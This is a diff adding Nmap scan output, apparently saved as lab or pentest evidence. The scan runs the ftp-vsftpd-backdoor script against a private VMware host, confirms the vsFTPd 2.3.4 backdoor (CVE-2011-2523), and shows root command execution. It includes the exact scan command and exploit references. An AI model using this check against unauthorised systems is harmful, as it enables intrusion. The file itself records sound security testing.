@@ -1,0 +1,24 @@
+# Nmap 7.99 scan initiated Wed Nov  4 02:03:07 2026 as: /usr/lib/nmap/nmap --privileged -p 21 --script ftp-vsftpd-backdoor -oN evidence/vsftpd-backdoor-check.txt 192.168.199.129
+Nmap scan report for 192.168.199.129
+Host is up (0.00031s latency).
+
+PORT   STATE SERVICE
+21/tcp open  ftp
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  BID:48539
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|       https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|_      https://www.securityfocus.com/bid/48539
+MAC Address: 00:0C:29:95:8F:71 (VMware)
+
+# Nmap done at Wed Nov  4 02:03:09 2026 -- 1 IP address (1 host up) scanned in 1.75 seconds
